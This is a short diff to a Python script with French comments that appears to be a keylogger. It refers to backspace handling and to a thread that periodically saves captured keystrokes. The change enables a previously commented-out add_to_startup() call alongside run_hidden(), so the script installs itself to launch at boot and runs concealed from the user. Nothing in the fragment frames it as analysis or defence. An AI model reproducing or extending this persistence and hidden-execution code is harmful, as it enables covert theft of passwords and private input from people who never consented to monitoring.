@@ -110,7 +110,7 @@ def handle_backspace():
 # Exécuter une fois pour ajouter au démarrage et masquer l'exécution
 if __name__ == "__main__":
     if not os.environ.get("IS_RUNNING_HIDDEN"):
-        #add_to_startup()
+        add_to_startup()
         run_hidden()
 
     # Thread pour sauvegarder les frappes périodiquement
